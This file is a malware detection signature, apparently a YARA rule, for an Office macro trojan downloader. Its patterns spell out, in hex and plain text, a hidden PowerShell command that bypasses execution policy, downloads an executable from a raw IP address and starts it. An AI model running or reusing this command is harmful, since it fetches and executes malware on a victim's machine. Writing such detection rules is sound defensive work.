
rule TrojanDownloader_O97M_Powdow_STX_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.STX!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 68 69 64 64 65 6e 20 2d 65 78 65 63 75 74 69 6f 6e 70 6f 6c 69 63 79 20 62 79 70 61 73 73 3b } //01 00  powershell -WindowStyle hidden -executionpolicy bypass;
		$a_01_1 = {49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 22 22 68 74 74 70 3a 2f 2f 36 32 2e 32 33 33 2e 35 37 2e 31 39 30 2f 7a 31 2f 50 54 54 5f 32 30 32 33 30 37 30 37 2d 57 41 30 31 31 32 30 78 6c 73 78 2e 65 78 65 22 22 20 2d 4f 75 74 46 69 6c 65 20 24 54 65 6d 70 46 69 6c 65 3b 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 24 54 65 6d 70 46 69 6c 65 3b } //00 00  Invoke-WebRequest -Uri ""http://62.233.57.190/z1/PTT_20230707-WA01120xlsx.exe"" -OutFile $TempFile; Start-Process $TempFile;
	condition:
		any of ($a_*)
 
}